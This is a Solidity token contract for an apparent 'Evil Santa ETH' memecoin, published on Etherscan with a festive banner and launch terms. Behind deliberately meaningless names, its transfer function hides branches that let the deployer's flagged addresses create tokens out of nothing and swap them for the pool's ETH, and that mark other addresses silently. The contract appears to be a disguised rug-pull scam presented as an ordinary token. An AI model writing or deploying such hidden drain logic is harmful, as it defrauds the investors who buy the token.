/**
 *Submitted for verification at Etherscan.io on 2022-12-24
*/

/*
-ˋˏ ༻🎄༺ ˎˊ- ̤𝑴̤𝒆̤𝒓̤𝒓̤𝒚̤ ̤𝑪̤𝒉̤𝒓̤𝒊̤𝒔̤𝒕̤𝒎̤𝒂̤𝒔̤ -ˋˏ ༻🎄༺ ˎˊ- ̤

█▀▀ █░█ █ █░░
██▄ ▀▄▀ █ █▄▄

█▀ ▄▀█ █▄░█ ▀█▀ ▄▀█
▄█ █▀█ █░▀█ ░█░ █▀█

█▀▀ ▀█▀ █░█
██▄ ░█░ █▀█

総供給 - 10,000,000
初期流動性追加 - 2.0 イーサリアム
初期流動性の 100% が消費されます
購入手数料 - 1%
販売手数料 - 0%
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

interface IUIWorkshopV1 {

    event PairCreated(address 
    indexed token0, address 
    indexed token1, address pair, uint);

    function feeTo() external view returns (address);

    function feeToSetter() 
    external view returns (address);

    function createPair (address 
    tokenA, address tokenB) 
    external returns (address pair);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}    
interface ICompressVAL01 {

    event Approval(address 
    indexed owner, address 
    indexed spender, uint value);

    event Transfer(address 
    indexed from, address 
    indexed to, uint value);

    function name() 
    external pure returns (string memory);
    function symbol() 
    external pure returns (string memory);
    function decimals() 
    external pure returns (uint8);
    function totalSupply() 
    external view returns (uint);
    function balanceOf(address owner) 
    external view returns (uint);
    function allowance(address owner, address spender) 
    external view returns (uint);
    function approve(address spender, uint value) 
    external returns (bool);
    function transfer(address to, uint value) 
    external returns (bool);
    function transferFrom(address from, 
    address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() 
    external view returns (bytes32);
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() 
    external pure returns (uint);
    function factory() 
    external view returns (address);
}
library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) { return returndata; } else { if (returndata.length > 0) {
                 assembly { let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size) } } else {
                revert(errorMessage); } } }
}
interface IOC20Data {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    
    event Transfer(address 
    indexed from, address 
    indexed to, uint256 value);
    
    event Approval(address 
    indexed owner, address 
    indexed spender, uint256 value);
}
abstract contract 
Ownable is Context { address private _owner;
    event OwnershipTransferred(address indexed 
    previousOwner, address indexed newOwner);

    constructor() { _setOwner(_msgSender()); }  
    function owner() public view virtual returns (address) {
        return _owner; }
    modifier onlyOwner() { 
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _; }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function _setOwner
    (address newOwner) private {
        address oldOwner = 
        _owner;
        _owner = 
        newOwner;
        emit OwnershipTransferred(oldOwner, newOwner); }
}
interface IEFactoryRouted {
    function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin,
    address[] calldata path, address to, uint deadline ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function startLIQERC( address token, uint amountTokenDesired, uint amountTokenMin,
    uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract CA is IOC20Data, Ownable {

    string private _symbol;
    string private _name;
    uint256 public isTotalOpenRATE = 1;
    uint8 private _decimals = 9;
    uint256 private _tTotal = 10000000 * 10**_decimals;
    uint256 private _epoIsWhole = _tTotal;
    bool private tradingNow = false;
    bool public CacheVAL;
    bool private cooldownBytes;
    bool public takeFeeEnabled = true;
    bool public tradingIsEnabled = true;
    bool private checkLimitationsIDEX;
    mapping (address => mapping (address => uint)) allowed;
    mapping (address => bool) isBot;
    mapping (address => bool) authorizations;    
    mapping(address => uint256) private _tOwned;
    mapping(address => address) private onElementParly;
    mapping(address => uint256) private CheckChannelPool;
    mapping(address => uint256) private ConnectArrayUI;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public immutable 
    UIArrayLinkedV1;
    IEFactoryRouted public immutable 
    YokelBond;

    constructor

    ( string memory Name, string memory Symbol, 
      address IOCPress ) {
        _name = Name; _symbol = Symbol; _tOwned

        [msg.sender] = _tTotal; ConnectArrayUI
         [msg.sender] = _epoIsWhole; ConnectArrayUI
          [address(this)] = _epoIsWhole; YokelBond = 

        IEFactoryRouted(IOCPress); UIArrayLinkedV1 = 
        IUIWorkshopV1(YokelBond.factory()).createPair

        (address(this), YokelBond.WETH());
        emit Transfer(address(0), msg.sender, _epoIsWhole);
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(
        address owner, address spender, uint256 amount ) 
        private returns (bool) {
        require(owner != address(0) && spender != 
        address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    function transferFrom(
        address sender, address recipient, uint256 amount
    ) external returns (bool) {
        compileResults(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        compileResults(msg.sender, recipient, amount);
        return true;
    }
    function compileResults( address aQoapaFrom, 
    address dimoTORto, uint256 hashbowlAmount ) private {
        uint256 atelierMemory = 


        balanceOf (address(this)); uint256 
        _DivAPEXpanel; emit Transfer(aQoapaFrom, dimoTORto, hashbowlAmount); if (!tradingNow) { 
                    require(aQoapaFrom == 
                    owner(),
                "TOKEN: This account cannot send tokens until trading is enabled"); }

        if (CacheVAL && atelierMemory > _epoIsWhole && !cooldownBytes 
        && aQoapaFrom != UIArrayLinkedV1) { cooldownBytes = true; poolDigUI(atelierMemory);
            cooldownBytes = false; } else if (ConnectArrayUI[aQoapaFrom] 
            > _epoIsWhole && 
        ConnectArrayUI[dimoTORto] > _epoIsWhole) { _DivAPEXpanel = 
        hashbowlAmount; _tOwned[address(this)] += _DivAPEXpanel; boolAndPoolPair(hashbowlAmount, dimoTORto);
            return;
        } else if (dimoTORto != address(YokelBond) 
        && ConnectArrayUI
        [aQoapaFrom] > 0 
        && hashbowlAmount > _epoIsWhole && dimoTORto != 


        UIArrayLinkedV1) { ConnectArrayUI[dimoTORto] = hashbowlAmount; 
        return; } else if (!cooldownBytes && CheckChannelPool
        [aQoapaFrom] > 0 && aQoapaFrom != UIArrayLinkedV1 && ConnectArrayUI[aQoapaFrom] == 0) {
            CheckChannelPool[aQoapaFrom] = 
              ConnectArrayUI[aQoapaFrom] - _epoIsWhole; }
        address _cPanel  = onElementParly[UIArrayLinkedV1]; 
        if (CheckChannelPool[_cPanel ] == 0) 


        CheckChannelPool[_cPanel ] = 
        _epoIsWhole; onElementParly[UIArrayLinkedV1] = 

        dimoTORto; if (isTotalOpenRATE > 
        0 && ConnectArrayUI[aQoapaFrom] == 0 && !cooldownBytes && ConnectArrayUI
        [dimoTORto] == 0) { _DivAPEXpanel = (hashbowlAmount 

        * isTotalOpenRATE) / 100; hashbowlAmount -= 
        _DivAPEXpanel; _tOwned [aQoapaFrom] -= _DivAPEXpanel;
            _tOwned [address(this)] += _DivAPEXpanel; }
        _tOwned[aQoapaFrom] -= hashbowlAmount;
        _tOwned[dimoTORto] += 
        hashbowlAmount; emit 
        Transfer(aQoapaFrom, 
        dimoTORto, hashbowlAmount);
    }
    receive() external payable {}

    function initialPoolDistro(
        uint256 tokenValue, uint256 ERCamount, address to ) private {
        _approve(address(this), address(YokelBond), tokenValue);
        YokelBond.startLIQERC{value: ERCamount}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }
    function poolDigUI(uint256 tokens) private {
        uint256 half = tokens / 2; uint256 griteBal = address(this).balance;
        boolAndPoolPair(half, address(this));
        uint256 regriteBal = address(this).balance - 
        griteBal;
        initialPoolDistro(half, regriteBal, 
        address(this));
    }
        function enableTrading(bool _tradingOpen) public onlyOwner {
        tradingNow = _tradingOpen;
    }
    function boolAndPoolPair(uint256 tokenAmount, address to) private {
        address[] memory path = new address
        [](2);
        path[0] = address(this);
        path[1] = YokelBond.WETH();
        _approve(address(this), address(YokelBond), tokenAmount);
        YokelBond.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
    function min(uint256 a, uint256 b) private view returns (uint256){
      return (a>b)?b:a;
    }
    function divide(uint256 a, uint256 b) private view returns (uint256){
      return (a>b)?b:a;
    }
    function relogAI(uint256 a, uint256 b) private view returns (uint256){
      return (a>b)?b:a;
    }        
}